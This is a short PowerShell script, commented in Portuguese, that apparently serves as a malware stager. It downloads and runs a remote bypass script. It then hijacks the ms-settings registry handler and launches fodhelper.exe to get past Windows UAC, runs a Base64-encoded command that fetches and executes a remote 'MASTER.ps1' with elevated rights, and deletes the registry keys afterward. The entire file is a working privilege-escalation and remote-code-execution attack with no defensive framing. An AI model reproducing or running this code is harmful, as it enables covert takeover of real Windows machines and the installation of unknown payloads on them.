iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EugeneBelford1995/Invoke-BypassII/main/Invoke-BypassII.ps1'))

# Log inicial
"$(Get-Date) - UAC-POWERSHELL-BYPASS iniciado" | Out-File "$env:TEMP\distraction_log.txt" -Append

# Define o comando para executar o MASTER.ps1 (em uma janela NORMAL)
$cmd = "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/MASTER.ps1'))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
$program = "powershell.exe -WindowStyle Normal -NoExit -EncodedCommand $encoded"

# Cria as chaves de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Dispara o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Normal
Start-Sleep 5
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

"$(Get-Date) - Bypass disparado. Aguardando MASTER.ps1..." | Out-File "$env:TEMP\distraction_log.txt" -Append